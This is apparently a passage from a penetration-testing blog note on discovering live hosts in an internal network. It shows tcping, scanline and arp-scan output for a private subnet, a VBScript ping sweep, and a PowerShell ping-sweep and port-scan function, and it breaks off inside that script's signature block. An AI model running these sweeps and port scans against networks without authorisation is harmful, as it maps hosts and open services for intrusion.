<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">tcping.exe -n 1 192.168.7.7 445<br><br>Probing 192.168.7.7:445/tcp - Port is open - time=1.719ms<br>Ping statistics for 192.168.7.7:445<br>     1 probes sent.<br>     1 successful, 0 failed.  (0.00% fail)<br>Approximate trip times in milli-seconds:<br>     Minimum = 1.719ms, Maximum = 1.719ms, Average = 1.719ms<br></code></pre></td></tr></table></figure>

<h3 id="scanline"><a href="#scanline" class="headerlink" title="scanline"></a>scanline</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">scanline.exe -n 192.168.7.0-255<br>ScanLine (TM) 1.01<br>Copyright (c) Foundstone, Inc. 2002<br>http://www.foundstone.com<br>Scan of 256 IPs started at Tue Feb 23 22:07:40 2021<br>-------------------------------------------------------------------------------<br>192.168.7.7<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>192.168.7.107<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>192.168.7.110<br>Responded in 0 ms.<br>0 hops away<br>Responds with ICMP unreachable: No<br>-------------------------------------------------------------------------------<br>Scan finished at Tue Feb 23 22:07:49 2021<br>3 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs<br></code></pre></td></tr></table></figure>

<h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p><a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-">arp-scan-windows</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">arp-scan.exe -t 192.168.7.0/24<br>Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300<br>Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500<br>Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500<br>Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700<br>Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500<br></code></pre></td></tr></table></figure>

<h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vbs">strSubNet = <span class="hljs-string">&quot;192.168.7.&quot;</span><br><span class="hljs-keyword">Set</span> objFSO= <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><span class="hljs-keyword">Set</span> objTS = objfso.CreateTextFile(<span class="hljs-string">&quot;C:\Result.txt&quot;</span>)<br><span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">254</span><br>strComputer = strSubNet &amp; i<br>blnResult = Ping(strComputer)<br><span class="hljs-keyword">If</span> blnResult = <span class="hljs-literal">True</span> <span class="hljs-keyword">Then</span><br>objTS.WriteLine strComputer &amp; <span class="hljs-string">&quot; is alived ! :) &quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Next</span><br>objTS.Close<br>WScript.Echo <span class="hljs-string">&quot;All Ping Scan , All Done ! :) &quot;</span><br><span class="hljs-keyword">Function</span> Ping(strComputer)<br><span class="hljs-keyword">Set</span> objWMIService = <span class="hljs-built_in">GetObject</span>(<span class="hljs-string">&quot;winmgmts:\\.\root\cimv2&quot;</span>)<br><span class="hljs-keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="hljs-string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="hljs-string">&quot;&#x27;&quot;</span>)<br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> objItem <span class="hljs-keyword">In</span> colItems<br><span class="hljs-keyword">Select</span> <span class="hljs-keyword">case</span> objItem.StatusCode<br><span class="hljs-keyword">Case</span> <span class="hljs-number">0</span><br>Ping = <span class="hljs-literal">True</span><br><span class="hljs-keyword">Case</span> <span class="hljs-keyword">Else</span><br>Ping = <span class="hljs-literal">False</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">select</span><br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">For</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br></code></pre></td></tr></table></figure>

<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p><code>Invoke-TSPingSweep.ps1</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke-TSPingSweep</span></span> &#123;<br>  <span class="hljs-comment">&lt;#</span><br><span class="hljs-comment">    <span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment">    Scan IP-Addresses, Ports and HostNames</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment">    Scan for IP-Addresses, HostNames and open Ports in your Network.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER StartAddress</span></span><br><span class="hljs-comment">    StartAddress Range</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER EndAddress</span></span><br><span class="hljs-comment">    EndAddress Range</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER ResolveHost</span></span><br><span class="hljs-comment">    Resolve HostName</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER ScanPort</span></span><br><span class="hljs-comment">    Perform a PortScan</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER Ports</span></span><br><span class="hljs-comment">    Ports That should be scanned, default values are: 21,22,23,53,69,71,80,98,110,139,111,</span><br><span class="hljs-comment">    389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,</span><br><span class="hljs-comment">    5801,5900,5555,5901</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.PARAMETER TimeOut</span></span><br><span class="hljs-comment">    Time (in MilliSeconds) before TimeOut, Default set to 100</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -TimeOut 500</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment">    http://www.truesec.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    <span class="hljs-doctag">.NOTES</span></span><br><span class="hljs-comment">    Goude 2012, TrueSec</span><br><span class="hljs-comment">  #&gt;</span><br>  <span class="hljs-keyword">Param</span>(<br>    [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$true</span>,<br>      <span class="hljs-type">Position</span> = <span class="hljs-number">0</span>)]<br>    [<span class="hljs-type">ValidatePattern</span>(<span class="hljs-string">&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;</span>)]<br>    [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$StartAddress</span>,<br>    [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$true</span>,<br>      <span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)]<br>    [<span class="hljs-type">ValidatePattern</span>(<span class="hljs-string">&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;</span>)]<br>    [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$EndAddress</span>,<br>    [<span class="hljs-type">switch</span>]<span class="hljs-variable">$ResolveHost</span>,<br>    [<span class="hljs-type">switch</span>]<span class="hljs-variable">$ScanPort</span>,<br>    [<span class="hljs-built_in">int</span>[]]<span class="hljs-variable">$Ports</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">53</span>,<span class="hljs-number">69</span>,<span class="hljs-number">71</span>,<span class="hljs-number">80</span>,<span class="hljs-number">98</span>,<span class="hljs-number">110</span>,<span class="hljs-number">139</span>,<span class="hljs-number">111</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">1080</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">2001</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">3001</span>,<span class="hljs-number">3128</span>,<span class="hljs-number">5222</span>,<span class="hljs-number">6667</span>,<span class="hljs-number">6868</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">7878</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5801</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">5901</span>),<br>    [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$TimeOut</span> = <span class="hljs-number">100</span><br>  )<br>  <span class="hljs-keyword">Begin</span> &#123;<br>    <span class="hljs-variable">$ping</span> = <span class="hljs-built_in">New-Object</span> System.Net.Networkinformation.Ping<br>  &#125;<br>  <span class="hljs-keyword">Process</span> &#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>])) &#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$b</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">2</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">2</span>])) &#123;<br>          <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$d</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$StartAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>]..<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) &#123;<br>            <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> PingSweep <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$d</span>/(<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) * <span class="hljs-number">100</span>)<br>            <span class="hljs-variable">$pingStatus</span> = <span class="hljs-variable">$ping</span>.Send(<span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span>,<span class="hljs-variable">$TimeOut</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pingStatus</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Success&quot;</span>) &#123;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ResolveHost</span>) &#123;<br>                <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> ResolveHost <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$d</span>/(<span class="hljs-variable">$EndAddress</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">3</span>])) * <span class="hljs-number">100</span>) <span class="hljs-literal">-Id</span> <span class="hljs-number">1</span><br>                <span class="hljs-variable">$getHostEntry</span> = [<span class="hljs-type">Net.DNS</span>]::BeginGetHostEntry(<span class="hljs-variable">$pingStatus</span>.Address, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>)<br>              &#125;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ScanPort</span>) &#123;<br>                <span class="hljs-variable">$openPorts</span> = <span class="hljs-selector-tag">@</span>()<br>                <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> <span class="hljs-variable">$ports</span>.Count;<span class="hljs-variable">$i</span>++) &#123;<br>                  <span class="hljs-variable">$port</span> = <span class="hljs-variable">$Ports</span>[(<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>)]<br>                  <span class="hljs-built_in">write-progress</span> <span class="hljs-literal">-activity</span> PortScan <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span> <span class="hljs-literal">-percentcomplete</span> ((<span class="hljs-variable">$i</span>/(<span class="hljs-variable">$Ports</span>.Count)) * <span class="hljs-number">100</span>) <span class="hljs-literal">-Id</span> <span class="hljs-number">2</span><br>                  <span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TcpClient<br>                  <span class="hljs-variable">$beginConnect</span> = <span class="hljs-variable">$client</span>.BeginConnect(<span class="hljs-variable">$pingStatus</span>.Address,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$null</span>,<span class="hljs-variable">$null</span>)<br>                  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$client</span>.Connected) &#123;<br>                    <span class="hljs-variable">$openPorts</span> += <span class="hljs-variable">$port</span><br>                  &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment"># Wait</span><br>                    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-variable">$TimeOut</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$client</span>.Connected) &#123;<br>                      <span class="hljs-variable">$openPorts</span> += <span class="hljs-variable">$port</span><br>                    &#125;<br>                  &#125;<br>                  <span class="hljs-variable">$client</span>.Close()<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ResolveHost</span>) &#123;<br>                <span class="hljs-variable">$hostName</span> = ([<span class="hljs-type">Net.DNS</span>]::EndGetHostEntry([<span class="hljs-type">IAsyncResult</span>]<span class="hljs-variable">$getHostEntry</span>)).HostName<br>              &#125;<br>              <span class="hljs-comment"># Return Object</span><br>              <span class="hljs-built_in">New-Object</span> PSObject <span class="hljs-literal">-Property</span> <span class="hljs-selector-tag">@</span>&#123;<br>                IPAddress = <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>.<span class="hljs-variable">$c</span>.<span class="hljs-variable">$d</span>&quot;</span>;<br>                HostName = <span class="hljs-variable">$hostName</span>;<br>                Ports = <span class="hljs-variable">$openPorts</span><br>              &#125; | <span class="hljs-built_in">Select-Object</span> IPAddress, HostName, Ports<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">End</span> &#123;<br>  &#125;<br>&#125;<br><span class="hljs-comment"># SIG # Begin signature block</span><br><span class="hljs-comment"># MIINGAYJKoZIhvcNAQcCoIINCTCCDQUCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB</span><br><span class="hljs-comment"># gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR</span><br><span class="hljs-comment"># AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUDtjslARLrEIY+LjC2tihCYoE</span><br><span class="hljs-comment"># ax2gggpaMIIFIjCCBAqgAwIBAgIQAupQIxjzGlMFoE+9rHncOTANBgkqhkiG9w0B</span><br><span class="hljs-comment"># AQsFADByMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYD</span><br><span class="hljs-comment"># VQQLExB3d3cuZGlnaWNlcnQuY29tMTEwLwYDVQQDEyhEaWdpQ2VydCBTSEEyIEFz</span><br><span class="hljs-comment"># c3VyZWQgSUQgQ29kZSBTaWduaW5nIENBMB4XDTE0MDcxNzAwMDAwMFoXDTE1MDcy</span><br><span class="hljs-comment"># MjEyMDAwMFowaTELMAkGA1UEBhMCQ0ExCzAJBgNVBAgTAk9OMREwDwYDVQQHEwhI</span><br><span class="hljs-comment"># YW1pbHRvbjEcMBoGA1UEChMTRGF2aWQgV2F5bmUgSm9obnNvbjEcMBoGA1UEAxMT</span><br><span class="hljs-comment"># RGF2aWQgV2F5bmUgSm9obnNvbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC</span><br><span class="hljs-comment"># ggEBAM3+T+61MoGxUHnoK0b2GgO17e0sW8ugwAH966Z1JIzQvXFa707SZvTJgmra</span><br><span class="hljs-comment"># ZsCn9fU+i9KhC0nUpA4hAv/b1MCeqGq1O0f3ffiwsxhTG3Z4J8mEl5eSdcRgeb+1</span><br><span class="hljs-comment"># jaKI3oHkbX+zxqOLSaRSQPn3XygMAfrcD/QI4vsx8o2lTUsPJEy2c0z57e1VzWlq</span><br><span class="hljs-comment"># KHqo18lVxDq/YF+fKCAJL57zjXSBPPmb/sNj8VgoxXS6EUAC5c3tb+CJfNP2U9vV</span><br><span class="hljs-comment"># oy5YeUP9bNwq2aXkW0+xZIipbJonZwN+bIsbgCC5eb2aqapBgJrgds8cw8WKiZvy</span><br><span class="hljs-comment"># Zx2qT7hy9HT+LUOI0l0K0w31dF8CAwEAAaOCAbswggG3MB8GA1UdIwQYMBaAFFrE</span><br><span class="hljs-comment"># uXsqCqOl6nEDwGD5LfZldQ5YMB0GA1UdDgQWBBTnMIKoGnZIswBx8nuJckJGsFDU</span><br><span class="hljs-comment"># lDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwdwYDVR0fBHAw</span><br><span class="hljs-comment"># bjA1oDOgMYYvaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItYXNzdXJlZC1j</span><br><span class="hljs-comment"># cy1nMS5jcmwwNaAzoDGGL2h0dHA6Ly9jcmw0LmRpZ2ljZXJ0LmNvbS9zaGEyLWFz</span><br><span class="hljs-comment"># c3VyZWQtY3MtZzEuY3JsMEIGA1UdIAQ7MDkwNwYJYIZIAYb9bAMBMCowKAYIKwYB</span><br><span class="hljs-comment"># BQUHAgEWHGh0dHBzOi8vd3d3LmRpZ2ljZXJ0LmNvbS9DUFMwgYQGCCsGAQUFBwEB</span><br><span class="hljs-comment"># BHgwdjAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tME4GCCsG</span><br><span class="hljs-comment"># AQUFBzAChkJodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRTSEEy</span><br><span class="hljs-comment"># QXNzdXJlZElEQ29kZVNpZ25pbmdDQS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG</span><br><span class="hljs-comment"># 9w0BAQsFAAOCAQEAVlkBmOEKRw2O66aloy9tNoQNIWz3AduGBfnf9gvyRFvSuKm0</span><br><span class="hljs-comment"># Zq3A6lRej8FPxC5Kbwswxtl2L/pjyrlYzUs+XuYe9Ua9YMIdhbyjUol4Z46jhOrO</span><br><span class="hljs-comment"># TDl18txaoNpGE9JXo8SLZHibwz97H3+paRm16aygM5R3uQ0xSQ1NFqDJ53YRvOqT</span><br><span class="hljs-comment"># 60/tF9E8zNx4hOH1lw1CDPu0K3nL2PusLUVzCpwNunQzGoZfVtlnV2x4EgXyZ9G1</span><br><span class="hljs-comment"># x4odcYZwKpkWPKA4bWAG+Img5+dgGEOqoUHh4jm2IKijm1jz7BRcJUMAwa2Qcbc2</span><br><span class="hljs-comment"># ttQbSj/7xZXL470VG3WjLWNWkRaRQAkzOajhpTCCBTAwggQYoAMCAQICEAQJGBtf</span><br><span class="hljs-comment"># 1btmdVNDtW+VUAgwDQYJKoZIhvcNAQELBQAwZTELMAkGA1UEBhMCVVMxFTATBgNV</span><br><span class="hljs-comment"># BAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEkMCIG</span><br><span class="hljs-comment"># A1UEAxMbRGlnaUNlcnQgQXNzdXJlZCBJRCBSb290IENBMB4XDTEzMTAyMjEyMDAw</span><br><span class="hljs-comment"># MFoXDTI4MTAyMjEyMDAwMFowcjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lD</span><br><span class="hljs-comment"># ZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTExMC8GA1UEAxMoRGln</span><br><span class="hljs-comment"># aUNlcnQgU0hBMiBBc3N1cmVkIElEIENvZGUgU2lnbmluZyBDQTCCASIwDQYJKoZI</span><br><span class="hljs-comment"># hvcNAQEBBQADggEPADCCAQoCggEBAPjTsxx/DhGvZ3cH0wsxSRnP0PtFmbE620T1</span><br><span class="hljs-comment"># f+Wondsy13Hqdp0FLreP+pJDwKX5idQ3Gde2qvCchqXYJawOeSg6funRZ9PG+ykn</span><br><span class="hljs-comment"># x9N7I5TkkSOWkHeC+aGEI2YSVDNQdLEoJrskacLCUvIUZ4qJRdQtoaPpiCwgla4c</span><br><span class="hljs-comment"># SocI3wz14k1gGL6qxLKucDFmM3E+rHCiq85/6XzLkqHlOzEcz+ryCuRXu0q16XTm</span><br><span class="hljs-comment"># K/5sy350OTYNkO/ktU6kqepqCquE86xnTrXE94zRICUj6whkPlKWwfIPEvTFjg/B</span><br><span class="hljs-comment"># ougsUfdzvL2FsWKDc0GCB+Q4i2pzINAPZHM8np+mM6n9Gd8lk9ECAwEAAaOCAc0w</span><br><span class="hljs-comment"># ggHJMBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQM</span><br><span class="hljs-comment"># 